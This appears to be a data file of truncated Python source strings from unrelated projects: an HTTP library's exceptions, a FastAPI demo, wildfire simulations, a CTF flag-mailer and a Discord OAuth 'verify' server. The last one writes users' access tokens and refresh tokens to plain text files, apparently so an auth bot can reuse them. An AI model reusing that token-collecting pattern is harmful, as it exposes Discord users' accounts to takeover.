    "from __future__ import absolute_import\n\nfrom .packages.six.moves.http_client import IncompleteRead as httplib_IncompleteRead\n\n# Base Exceptions\n\n\nclass HTTPError(Exception):\n    \"\"\"Base exception used by this module.\"\"\"\n\n    pass\n\n\nclass HTTPWarning(Warning):\n    \"\"\"Base warning used by this module.\"\"\"\n\n    pass\n\n\nclass PoolError(HTTPError):\n    \"\"\"Base exception for errors caused within a pool.\"\"\"\n\n    def __init__(self, pool, message):\n        self.pool = pool\n        HTTPError.__init__(self, \"%s: %s\" % (pool, message))\n\n    def __reduce__(self):\n        # For pickling purposes.\n        return self.__class__, (None, None)\n\n\nclass RequestError(PoolError):\n    \"\"\"Base exception for PoolErrors that have associated URLs.\"\"\"\n\n    def __init__(self, pool, url, message):\n        self.url = url\n        PoolError.__init__(self, pool, message)\n\n    def __reduce__(self):\n        # For pickling purposes.\n        return self.__class__, (None, self.url, None)\n\n\nclass SSLError(HTTPError):\n    \"\"\"Raised when SSL certificate fails in an HTTPS connection.\"\"\"\n\n    pass\n\n\nclass ProxyError(HTTPError):\n    \"\"\"Raised when the connection to a proxy fails.\"\"\"\n\n    def __init__(self, message, error, *args):\n        super(ProxyError, self).__init__(message, error, *args)\n        self.original_error = error\n\n\nclass DecodeError(HTTPError):\n    \"\"\"Raised when automatic decoding based on Content-Type fails.\"\"\"\n\n    pass\n\n\nclass ProtocolError(HTTPError):\n    \"\"\"Raised when something unexpected happens mid-request/response.\"\"\"\n\n    pass\n\n\n#: Renamed to ProtocolError but aliased for backwards compatibility.\nConnectionError = ProtocolError\n\n\n# Leaf Exceptions\n\n\nclass MaxRetryError(RequestError):\n    \"\"\"Raised when the maximum number of retries is exceeded.\n\n    :param pool: The connection pool\n    :type pool: :class:`~urllib3.connectionpool.HTTPConnectionPool`\n    :param string url: The requested Url\n    :param exceptions.Exception reason: The underlying error\n\n    \"\"\"\n\n    def __init__(self, pool, url, reason=None):\n        self.reason = reason\n\n        message = \"Max retries exceeded with url: %s (Caused by %r)\" % (url, reason)\n\n        RequestError.__init__(self, pool, url, message)\n\n\nclass HostChangedError(RequestError):\n    \"\"\"Raised when an existing pool gets a request for a foreign host.\"\"\"\n\n    def __init__(self, pool, url, retries=3):\n        message = \"Tried to open a foreign host with url: %s\" % url\n        RequestError.__init__(self, pool, url, message)\n        self.retries = retries\n\n\nclass TimeoutStateError(HTTPError):\n    \"\"\"Raised when passing an invalid state to a timeout\"\"\"\n\n    pass\n\n\nclass TimeoutError(HTTPError):\n    \"\"\"Raised when a socket timeout error occurs.\n\n    Catching this error will catch both :exc:`ReadTimeoutErrors\n    <ReadTimeoutError>` and :exc:`ConnectTimeoutErrors <ConnectTimeoutError>`.\n    \"\"\"\n\n    pass\n\n\nclass ReadTimeoutError(TimeoutError, RequestError):\n    \"\"\"Raised when a socket timeout occurs while receiving data from a server\"\"\"\n\n    pass\n\n\n# This timeout error does not have a URL attached and needs to inherit from the\n# base HTTPError\nclass ConnectTimeoutError(TimeoutError):\n    \"\"\"Raised when a socket timeout occurs while connecting to a server\"\"\"\n\n    pass\n\n\nclass NewConnectionError(ConnectTimeoutError, PoolError):\n    \"\"\"Raised when we fail to establish a new connection. Usually ECONNREFUSED.\"\"\"\n\n    pass\n\n\nclass EmptyPoolError(PoolError):\n    \"\"\"Raised when a pool runs out of connections and no more are allowed.\"\"\"\n\n    pass\n\n\nclass ClosedPoolError(PoolError):\n    \"\"\"Raised when a request enters a pool after the pool has been closed.\"\"\"\n\n    pass\n\n\nclass LocationValueError(ValueError, HTTPError):\n    \"\"\"Raised when there is something wrong with a given URL input.\"\"\"\n\n    pass\n\n\nclass LocationParseError(LocationValueError):\n    \"\"\"Raised when get_host or similar fails to parse the URL input.\"\"\"\n\n    def __init__(self, location):\n        message = \"Failed to parse: %s\" % location\n        HTTPError.__init__(self, message)\n\n        self.location = location\n\n\nclass URLSchemeUnknown(LocationValueError):\n    \"\"\"Raised when a URL input has an unsupported scheme.\"\"\"\n\n    def __init__(self, scheme):\n        message = \"Not supported URL scheme %s\" % scheme\n        super(URLSchemeUnknown, self).__init__(message)\n\n        self.scheme = scheme\n\n\nclass ResponseError(HTTPError):\n    \"\"\"Used as a container for an error reason supplied in a MaxRetryError.\"\"\"\n\n    GENERIC_ERROR = \"too many error responses\"\n    SPECIFIC_ERROR = \"too many {status_code} error responses\"\n\n\nclass SecurityWarning(HTTPWarning):\n    \"\"\"Warned when performing security reducing actions\"\"\"\n\n    pass\n\n\nclass SubjectAltNameWarning(SecurityWarning):\n    \"\"\"Warned when connecting to a host with a certificate missing a SAN.\"\"\"\n\n    pass\n\n\nclass InsecureRequestWarning(SecurityWarning):\n    \"\"\"Warned when making an unverified HTTPS request.\"\"\"\n\n    pass\n\n\nclass SystemTimeWarning(SecurityWarning):\n    \"\"\"Warned when system time is suspected to",
    "from fastapi import FastAPI, HTTPException\nfrom models import User, Gender, Roles\nfrom uuid import UUID, uuid4\n\napp = FastAPI()\n\ndb = [\n    User(id=UUID(\"229f3e81-72b1-4c13-a15d-ded8f6a74966\"), first_name=\"jamila\", last_name=\"kane\", middle_name=\"your_middle_name\", gender=Gender.female, roles=[Roles.student]),\n    User(id=UUID(\"a85b817e-4e66-4123-8da4-a6fae49589db\"), first_name=\"james\", last_name=\"arry\", middle_name=\"demo\", gender=Gender.female, roles=[Roles.admin, Roles.user])\n]\n\n@app.get(\"/\")\nasync def root():\n    return {\"Hello\": \"junior\"}\n\n@app.get(\"/api/v1/users\")\nasync def fetch_users():\n    return db\n\n@app.post(\"/api/v1/users\")\nasync def register_user(user: User):\n    db.append(user)\n    return {\"id\": user.id}\n\n@app.delete(\"/api/v1/users/{user_id}\")\nasync def delete_user(user_id: UUID):\n    for user in db:\n        if user.id == user_id:\n            db.remove(user)\n            return\n    raise HTTPException(\n        status_code=404,\n        detail=f\"user with id : {user_id} does not exist\"\n    )\n\n@app.put(\"/api/v1/users/{user_id}\")\nasync def update_user(user_id: UUID, updated_user: User):\n    for index, user in enumerate(db):\n        if user.id == user_id:\n            db[index] = updated_user\n            return {\"message\": \"User updated successfully\"}\n    raise HTTPException(\n        status_code=404,\n        detail=f\"user with id : {user_id} does not exist\"\n    )",
    "\"\"\"\r\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u043f\u0440\u043e\u0435\u043a\u0442\u0430:\r\n\u042d\u0442\u043e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043d\u0430 \u043e\u0441\u043d\u043e\u0432\u0435 \u043a\u043b\u0435\u0442\u043e\u0447\u043d\u044b\u0445 \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u043e\u0432 \u0431\u0443\u0434\u0435\u0442 \u0441\u0438\u043c\u0443\u043b\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0440\u0435\u0430\u043b\u044c\u043d\u0443\u044e \u0433\u0435\u043e\u0433\u0440\u0430\u0444\u0438\u0447\u0435\u0441\u043a\u0443\u044e \u043c\u0435\u0441\u0442\u043d\u043e\u0441\u0442\u044c \u0438\r\n\u0440\u0430\u0441\u043f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043e\u0433\u043d\u044f \u043d\u0430 \u043d\u0435\u0439 \u0432 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0442\u0438 \u043e\u0442 \u0440\u0430\u0437\u043d\u044b\u0445 \u0443\u0441\u043b\u043e\u0432\u0438\u0439\r\n\r\n\u0421\u043f\u0438\u0441\u043e\u043a \u0437\u0430\u0434\u0430\u0447:\r\n1. \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u043b\u0435\u0441\u0430 +\r\n2. \u0420\u0430\u0441\u043f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043e\u0433\u043d\u044f +\r\n3. \u0418\u043c\u0438\u0442\u0430\u0446\u0438\u044f \u0432\u043e\u0434\u043d\u044b\u0445 \u043f\u0440\u0435\u0433\u0440\u0430\u0434 +\r\n4. \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0440\u0435\u043b\u044c\u0435\u0444\u0430 \u043d\u0430 \u043c\u043e\u0434\u0435\u043b\u0438\r\n5. \u0418\u043c\u0438\u0442\u0430\u0446\u0438\u044f \u0432\u0435\u0442\u0440\u0430 +\r\n6. \u041f\u043e\u0441\u0442\u0440\u043e\u0435\u043d\u0438\u0435 \u0440\u0435\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043b\u0430\u043d\u0434\u0448\u0430\u0444\u0442\u0430 \u043f\u043e \u0442\u043e\u043f\u043e\u0433\u0440\u0430\u0444\u0438\u0447\u0435\u0441\u043a\u043e\u0439 \u043a\u0430\u0440\u0442\u0435\r\n7. \u041e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u043f\u043e\u0441\u0451\u043b\u043a\u043e\u0432 \u0438 \u0433\u043e\u0440\u043e\u0434\u043e\u0432\r\n\r\n\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c\u044b\u0435 \u043f\u0430\u0442\u0435\u0440\u043d\u044b \u0438 \u0438\u0445 \u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435:\r\n1. \u041f\u0440\u0430\u0432\u0438\u043b\u043e B35678/S5678 - \u0414\u0438\u0430\u043c\u0451\u0431\u0430 - \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u043b\u0435\u0441\u0430\r\n2. \u041f\u0440\u0430\u0432\u0438\u043b\u043e B4678/S35678 - \u041e\u0442\u0436\u0438\u0433 - \u0418\u043c\u0438\u0442\u0430\u0446\u0438\u044f \u043e\u0433\u043d\u044f\r\n\r\n\u0420\u0430\u0437\u043d\u043e\u0432\u0438\u0434\u043d\u043e\u0441\u0442\u0438 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u044f \u043a\u043b\u0435\u0442\u043e\u043a:\r\n0 - \u0422\u0440\u0430\u0432\u0430\r\n1 - \u0414\u0435\u0440\u0435\u0432\u043e\r\n2 - \u041e\u0433\u043e\u043d\u044c\r\n3 - \u0412\u043e\u0434\u0430\r\n4 - \u0417\u0435\u043c\u043b\u044f\r\n\"\"\"\r\n\r\nimport random\r\nimport time\r\nimport asyncio\r\nimport math\r\nimport pygame\r\nimport numpy as np\r\n\r\n\r\n# \u041d\u0430\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0432\u0435\u0442\u0440\u0430\r\n\"\"\"\u0412\u0438\u0434\u044b \u0432\u0435\u0442\u0440\u0430 \u0438 \u0438\u0445 \u0437\u0430\u043f\u0438\u0441\u044c:\r\nNone - \u043e\u0442\u0441\u0443\u0441\u0442\u0441\u0442\u0432\u0438\u0435 \u0432\u0435\u0442\u0440\u0430\r\nN - \u0441\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u0435\u0442\u0435\u0440\r\nS - \u044e\u0436\u043d\u044b\u0439 \u0432\u0435\u0442\u0435\u0440\r\nW - \u0437\u0430\u043f\u0430\u0434\u043d\u044b\u0439 \u0432\u0435\u0442\u0435\u0440\r\nE - \u0432\u043e\u0441\u0442\u043e\u0447\u043d\u044b\u0439 \u0432\u0435\u0442\u0435\u0440\r\nNE - \u0441\u0435\u0432\u0435\u0440\u043e-\u0432\u043e\u0441\u0442\u043e\u0447\u043d\u044b\u0439\r\nSE - \u044e\u0433\u043e-\u0432\u043e\u0441\u0442\u043e\u0447\u043d\u044b\u0439\r\nSW - \u044e\u0436\u043d\u043e-\u0437\u0430\u043f\u0430\u0434\u043d\u044b\u0439\r\nNW - \u0441\u0435\u0432\u0435\u0440\u043e-\u0432\u043e\u0441\u0442\u043e\u0447\u043d\u044b\u0439\r\n\r\n\u0412\u043b\u0430\u0436\u043d\u043e\u0441\u0442\u044c:\r\n\u0435\u0441\u043b\u0438 \u043d\u0438\u0436\u0435 30, \u0442\u043e \u043d\u0435 \u0432\u043b\u0438\u044f\u0435\u0442 \u043d\u0430 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c\r\n\u0435\u0441\u0434\u0438 \u043e\u0442 30 \u0438 \u0434\u043e 70 \u0437\u0430\u043c\u0435\u0434\u043b\u044f\u0435\u0442 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c\r\n\u0435\u0441\u043b\u0438 \u043e\u0442 70 \u0438 \u0434\u043e 100, \u0442\u043e \u043e\u0447\u0435\u043d\u044c \u0437\u0430\u043c\u0435\u0434\u043b\u044f\u0435\u0442 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c\r\n\r\n\u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0432\u0435\u0442\u0440\u0430:\r\n\r\n\r\n\u0422\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u0430:\r\n\u0435\u0441\u043b\u0438 \u0434\u043e 15 \u0433\u0440\u0430\u0434\u0443\u0441\u043e\u0432 - \u043d\u0435 \u0432\u043b\u0438\u044f\u0435\u0442\r\n\u043e\u0442 15 \u0438 \u0434\u043e 25 - \u0443\u0432\u0435\u043b\u0438\u0447\u0438\u0432\u0430\u0435\u0442 \u043d\u0435\u043c\u043d\u043e\u0433\u043e \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c\r\n\u0432\u044b\u0448\u0435 25 - \u0441\u0438\u043b\u044c\u043d\u043e \u0443\u0432\u0435\u043b\u0438\u0447\u0438\u0432\u0430\u0435\u0442 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c\r\n\r\n\"\"\"\r\n\r\nwith open(\"settings.txt\", \"r\") as file:\r\n    contents = file.readlines()\r\n\r\ndirection_of_the_wind = contents[0].replace('\\n', '')\r\nseason = contents[1].replace(\"\\n\", \"\")\r\nif len(contents) == 4:\r\n    temperature = None\r\nelse:\r\n    temperature = contents[4]\r\nhumidity = contents[3].replace(\"\\n\", \"\")\r\nwind_speed = contents[2].replace('\\n', '')\r\nif direction_of_the_wind is None:\r\n    direction_of_the_wind = None\r\nif season is None:\r\n    season = None\r\nif temperature is None:\r\n    temperature = None\r\nif humidity is None:\r\n    humidity = None\r\nif int(humidity) > 100:\r\n    raise ValueError(\"\u0412\u043b\u0430\u0436\u043d\u043e\u0441\u0442\u044c \u0432\u043e\u0437\u0434\u0443\u0445\u0430 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u043f\u0440\u0435\u0432\u044b\u0449\u0430\u0442\u044c 100 \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043e\u0432\")\r\nif wind_speed is None:\r\n    wind_speed = None\r\n\r\n\r\ndef generate_coordinates(min_distance: int, field_size: int, num_points: int):\r\n    \"\"\"\u0413\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440 \u0440\u0430\u043d\u0434\u043e\u043c\u043d\u044b\u0445 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\r\n    \u041d\u0430 \u0432\u0445\u043e\u0434 \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 \u0442\u0440\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f: \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0434\u0438\u0441\u0442\u0430\u043d\u0446\u0438\u044f \u043c\u0435\u0436\u0434\u0443 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u043c\u0438; \u0440\u0430\u0437\u043c\u0435\u0440 \u043f\u043e\u043b\u044f \u0432 \u0444\u043e\u0440\u043c\u0430\u0442\u0435 N x N;\r\n    \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0430\u0440 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0432\u0430\u043c \u043d\u0443\u0436\u043d\u044b\"\"\"\r\n    points = []\r\n    while len(points) < num_points:\r\n        new_point = [random.randint(0, field_size), random.randint(0, field_size)]\r\n        if all(math.sqrt((p[0] - new_point[0]) ** 2 + (p[1] - new_point[1]) ** 2) >= min_distance for p in points):\r\n            points.append(new_point)\r\n    return points\r\n\r\n# \u0421\u043e\u0437\u0434\u0430\u0451\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u0442\u043e\u0447\u0435\u043a \u0432\u043e\u0437\u0433\u0430\u0440\u0430\u043d\u0438\u044f \u0434\u043b\u044f \u0434\u0430\u043b\u044c\u043d\u0435\u0439\u0448\u0435\u0433\u043e \u0440\u0430\u0441\u0447\u0451\u0442\u0430 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u0438 \u0434\u0432\u0438\u0436\u0435\u043d\u0438\u044f \u043e\u0433\u043d\u044f\r\nflashpoints = []\r\n\r\n# \u0412\u044b\u0431\u043e\u0440\u043a\u0430 \u0440\u0430\u043d\u0434\u043e\u043c\u043d\u044b\u0445 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\r\ncoordinates = generate_coordinates(8, 99, 7)  # \u043b\u0435\u0441\r\ncoordinates_lakes = generate_coordinates(5, 99, 15)  # \u043e\u0437\u0451\u0440\u0430\r\n\r\n# \u0420\u0430\u0437\u043c\u0435\u0440\u044b \u043e\u043a\u043d\u0430\r\nWIDTH, HEIGHT = 1000, 1000\r\n\r\n# \u0420\u0430\u0437\u043c\u0435\u0440\u044b \u0441\u0435\u0442\u043a\u0438\r\nROWS, COLS = 100, 100\r\n\r\n# \u0420\u0430\u0437\u043c\u0435\u0440 \u043a\u0430\u0436\u0434\u043e\u0439 \u043a\u043b\u0435\u0442\u043a\u0438\r\nCELL_WIDTH = WIDTH // COLS\r\nCELL_HEIGHT = HEIGHT // ROWS\r\n\r\n# \u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043e\u043a\u043d\u0430\r\npygame.display.set_caption(\"\u0418\u043c\u0438\u0442\u0430\u0446\u0438\u044f \u043b\u0435\u0441\u043d\u044b\u0445 \u043f\u043e\u0436\u0430\u0440\u043e\u0432. \u041f\u043e\u043a\u043e\u043b\u0435\u043d\u0438\u0435: 0\")\r\n\r\n# \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f Pygame\r\npygame.init()\r\n\r\n# \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0441\u0435\u0442\u043a\u0438\r\ngrid = np.zeros((ROWS, COLS))\r\n\r\ndef update_grid_forest_building():\r\n    \"\"\"\u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u0441\u0435\u0442\u043a\u0438(\u043f\u043e\u0441\u0442\u0440\u043e\u0435\u043d\u0438\u0435 \u043b\u0435\u0441\u0430) \u043f\u043e \u043f\u0440\u0438\u043d\u0446\u0438\u043f\u0443 \u043f\u0440\u0430\u0432\u0438\u043b\u0430 '\u0414\u0438\u0430\u043c\u0451\u0431\u0430'\"\"\"\r\n    global grid\r\n    new_grid = grid.copy()\r\n    for i in range(ROWS):\r\n        for j in range(COLS):\r\n            state = grid[i][j]\r\n            neighbours_list = get_neighbours_mode(i, j)\r\n            if state == 0 and (neighbours_list[1] == 3 or 5 <= neighbours_list[1] <= 8):  # \u041f\u0440\u0430\u0438\u0432\u043b\u043e \u0440\u043e\u0436\u0434\u0435\u043d\u0438\u044f\r\n                new_grid[i][j] = 1\r\n            elif state == 1 and (1 <= neighbours_list[1] <= 2 or neighbours_list[1] == 4):  # \u041f\u0440\u0430\u0432\u0438\u043b\u043e \u0441\u043c\u0435\u0440\u0442\u0438\r\n                new_grid[i][j] = 0\r\n    grid = new_grid\r\n\r\ndef update_grid_lakes_building():\r\n    \"\"\"\u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u0441\u0435\u0442\u043a\u0438(\u043f\u043e\u0441\u0442\u0440\u043e\u0435\u043d\u0438\u0435 \u043e\u0437\u0451\u0440) \u043f\u043e \u043f\u0440\u0438\u043d\u0446\u0438\u043f\u0443 \u043f\u0440\u0430\u0432\u0438\u043b\u0430 '\u0414\u0438\u0430\u043c\u0451\u0431\u0430'\"\"\"\r\n    global grid\r\n    new_grid = grid.copy()\r\n    for i in range(ROWS):\r\n        for j in range(COLS):\r\n            state = grid[i][j]\r\n            neighbours_list = get_neighbours_mode(i, j)\r\n            if state == 0 and (neighbours_list[3] == 3 or 5 <= neighbours_list[3] <= 8):  # \u041f\u0440\u0430\u0438\u0432\u043b\u043e \u0440\u043e\u0436\u0434\u0435\u043d\u0438\u044f\r\n                new_grid[i][j] = 3\r\n            elif state == 3 and (1 <= neighbours_list[3] <= 2 or neighbours_list[3] == 4):  # \u041f\u0440\u0430\u0432\u0438\u043b\u043e \u0441\u043c\u0435\u0440\u0442\u0438\r\n                new_grid[i][j] = 0\r\n    grid = new_grid\r\n\r\ndef update_grid_fire():\r\n    \"\"\"\u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u0441\u0435\u0442\u043a\u0438(\u0432\u0437\u0430\u0438\u043c\u043e\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 \u043e\u0433\u043d\u044f \u0441 \u0434\u0435\u0440\u0435\u0432\u043e\u043c, \u0438 \u0441 \u0432\u043e\u0434\u043e\u0439, \u0438 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u044c \u043e\u0442 \u0432\u0435\u0442\u0440\u0430)\r\n    - \u041f\u0420\u0410\u0412\u0418\u041b\u041e \u041f\u041e\u0412\u0415\u0414\u0415\u041d\u0418\u042f \u041e\u0413\u041d\u042f -\r\n    \"\"\"\r\n    global grid\r\n    global direction_of_the_wind\r\n    new_grid = grid.copy()\r\n    for i in range(ROWS):\r\n        for j in range(COLS):\r\n            state = grid[i][j]\r\n            neighbours_list = get_neighbours_mode(i, j)\r\n\r\n            \"\"\"\u0417\u0430\u0434\u0430\u0451\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u0432\u0438\u0436\u0435\u043d\u0438\u044f \u043e\u0433\u043d\u044f \u0432 \u0440\u0430\u0437\u043d\u044b\u0435 \u0441\u0442\u043e\u0440\u043e\u043d\u044b \u043f\u043e \u043b\u0435\u0441\u043d\u043e\u0439 \u043c\u0435\u0441\u0442\u043d\u043e\u0441\u0442\u0438 \u0438 \u0442\u0440\u0430\u0432\u0435\"\"\"\r\n            def fire_down(x, y):\r\n                # \u0440\u0430\u0441\u043f\u0440\u043e\u043b\u0441\u0442\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043e\u0433\u043d\u044f \u043d\u0430 \u043a",
    "import smtplib\n\nclass floaty:\n    def __init__(self):\n        self.email = \"your-email-here\"\n        self.password = \"your-password-here\"\n        self.flag = \"real-flag-here\"\n        self.fake = \"fake-flag-here\"\n        self.sendto = \"\"\n\n#set who messege gets sent to\n    def setSender(self, email):\n        self.sendto = email\n\n#Check Responds for flag or fake\n    def checkResponds(self, responds):\n        if \"flag\" in responds:\n            self.sendFlag()\n        else:\n            self.sendFake()\n\n#Send Flag if requested\n    def sendFlag(self):\n        server = smtplib.SMTP('smtp.gmail.com', 587)\n        server.starttls()\n        server.login(self.email,self.password)\n        server.sendmail(self.email, self.sendto, self.flag)\n        server.quit()\n\n#Send Fake messege if flag not requested\n    def sendFake(self):\n        server = smtplib.SMTP('smtp.gmail.com', 587)\n        server.starttls()\n        server.login(self.email,self.password)\n        server.sendmail(self.email, self.sendto, self.fake)\n        server.quit()\n",
    "\"\"\"\nBayesian Physics Informed Neural Network (B-PINN)\n\n[1] Joel Janek Dabrowski, Daniel Edward Pagendam, James Hilton, Conrad Sanderson, \n    Daniel MacKinlay, Carolyn Huston, Andrew Bolt, Petra Kuhnert, \"Bayesian \n    Physics Informed Neural Networks for Data Assimilation and Spatio-Temporal \n    Modelling of Wildfires\", Spatial Statistics, Volume 55, June 2023, 100746\n    https://www.sciencedirect.com/science/article/pii/S2211675323000210\n[2] Liu Yang, Xuhui Meng, George Em Karniadakis, \"B-PINNs: Bayesian \n    Physics-Informed Neural Networks for Forward and Inverse PDE Problems with \n    Noisy Data\", Journal of Computational Physics Volume 425, 15 January 2021, \n    109913\n    https://www.sciencedirect.com/science/article/pii/S0021999120306872\n\"\"\"\n\n__author__      = \"Joel Janek Dabrowski\"\n__license__     = \"MIT license\"\n__version__     = \"0.0.0\"\n\n\nimport torch\nimport torch.nn as nn\nfrom tqdm import tqdm\nimport math\nfrom mlp import MLP_Bayesian\n\nclass PINN_Bayesian(nn.Module):\n    def __init__(self, layer_dims_list, activation_function='relu', save_file='model_parameters/bpinn.pt'):\n        \"\"\"\n        Constructor\n\n        :param layer_dims_list: list containing the number of units in each \n            layer (including the input and output layers) of the MLP for u_model\n        :param activation_function: activation function in the MLP. Options: \n            relu, tanh, and silu. Defaults to 'relu'\n        :param save_file: path and name of the file in which to store the model \n            parameters, defaults to 'model_parameters/bpinn.pt'\n        \"\"\"\n        super(PINN_Bayesian, self).__init__()\n        self.layer_dims_list = layer_dims_list\n        # Number of Monte Carlo samples of the weights z drawn from the \n        # variational posterior\n        self.n_mc_samples = 1\n        # Model\n        self.u_model = MLP_Bayesian(layer_dims_list, activation_function=activation_function)\n        self.save_file = save_file\n        self.device = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n        self.u_model.to(self.device)\n\n    def log_prior(self):\n        \"\"\"\n        Calculate the log of the prior distribution of the weights over all \n        layers in the network\n        \n        :return: log prior probability (scalar)\n        \"\"\"\n        log_prior = 0\n        for layer in self.u_model.layers:\n            log_prior += layer.log_prior\n        return log_prior\n\n    def log_variational_posterior(self):\n        \"\"\"\n        Calculate the log of the posterior of the weights given the data over \n        all layers in the network\n        \n        :return: log of the posterior probability (scalar)\n        \"\"\"\n        log_variational_posterior = 0\n        for layer in self.u_model.layers:\n            log_variational_posterior += layer.log_variational_posterior\n        return log_variational_posterior\n\n\n    def gaussian_log_likelihood(self, y, y_hat, sigma2):\n        \"\"\"\n        Calculate the Gaussian log likelihood of the data given the model.\n        The Gaussian has mean at y_hat and standard deviation given by \n        noise_tol. The log likelihood is calculated for the data sample y.\n        \n        :param y: The ground truth data\n        :param y_hat: The model prediction\n        :param noise_tol: the standard deviation of the distribution\n        :return: the log likelihood of the data given the model (scalar)\n        \"\"\"\n        log_gauss = (-math.log(math.sqrt(2 * math.pi * sigma2))\n                     - ((y - y_hat) ** 2) / (2 * sigma2)).sum()\n        return log_gauss\n\n    \n    def forward(self, t, x, y, s, wx, wy):\n        \"\"\"\n        Predict the level-set function given a set of inputs\n\n        :param t: time tensor with shape [batch_size, 1]\n        :param x: tensor over x-spatial dimension with shape [batch_size, 1]\n        :param y: tensor over y-spatial dimension with shape [batch_size, 1]\n        :param s: fire-front speed constant with shape [batch_size, 1]\n        :param wx: wind speed in the x-direction with shape [batch_size, 1]\n        :param wy: wind speed in the x-direction with shape [batch_size, 1]\n        :return: the level set function prediction and the partial derivatives \n            of the level set function with respect to time and space\n        \"\"\"\n        t = t.to(self.device)\n        x = x.to(self.device)\n        y = y.to(self.device)\n        s = s.to(self.device)\n        wx = wx.to(self.device)\n        wy = wy.to(self.device)\n        # Compute u_t using the neural network\n        model_in = torch.cat((t, x, y, s, wx, wy), dim=1).to(self.device)\n        u = self.u_model(model_in, sample=True)\n        # Compute du/dt\n        dudt = torch.autograd.grad(outputs=u, inputs=t, grad_outputs=torch.ones_like(u, device=self.device), create_graph=True)[0]\n        # Compute du/dx\n        dudx = torch.autograd.grad(outputs=u, inputs=x, grad_outputs=torch.ones_like(u, device=self.device), create_graph=True)[0]\n        # Compute du/dy\n        dudy = torch.autograd.grad(outputs",
    "from flask import Flask, request\r\nfrom discord_webhook import DiscordWebhook, DiscordEmbed\r\nimport requests, discord, ctypes\r\n\r\nctypes.windll.kernel32.SetConsoleTitleW(f'App verify')\r\n\r\ndef get_access_token(code):\r\n\r\n    API_ENDPOINT = 'https://discord.com/api/v10'\r\n    CLIENT_ID = ''\r\n    CLIENT_SECRET = ''\r\n    REDIRECT_URI = ''\r\n    BOTTOKEN = ''\r\n\r\n    data = {\r\n        'client_id': CLIENT_ID,\r\n        'client_secret': CLIENT_SECRET,\r\n        'grant_type': 'authorization_code',\r\n        'code': code,\r\n        'redirect_uri': REDIRECT_URI\r\n    }\r\n    headers = {\r\n        'Content-Type': 'application/x-www-form-urlencoded',\r\n        'Authorization': f'Bot {BOTTOKEN}'\r\n    }\r\n    r = requests.post('%s/oauth2/token' % API_ENDPOINT, data=data, headers=headers).json()\r\n    print(r)\r\n    token = r['access_token']\r\n    refresh = r['refresh_token']\r\n    try:\r\n\r\n        headers = {\r\n            'Authorization': f'Bearer {token}'}\r\n        r = requests.get('https://discordapp.com/api/users/@me', headers=headers).json()\r\n        uid = r[\"id\"]\r\n        username = r['username']\r\n    except Exception as e:\r\n        print(e)\r\n    return token, uid, refresh, username\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route('/',methods = ['get'])\r\ndef main():\r\n    code = request.args.get('code')\r\n    guild = request.args.get('state')\r\n    ip = request.remote_addr\r\n    total = sum(1 for line in open('db.txt'))\r\n    token, userID, refresh, username = get_access_token(code)\r\n    BOTTOKEN = ''\r\n    duplicate = open('db.txt', 'r').read()\r\n    if userID in duplicate:\r\n        return 'Already verified.'\r\n    else:\r\n        f = open(\"db.txt\", \"a\")\r\n        f.write(f'{token}:{userID}\\n')\r\n        f.close()\r\n\r\n        f = open(\"refresh.txt\", \"a\")\r\n        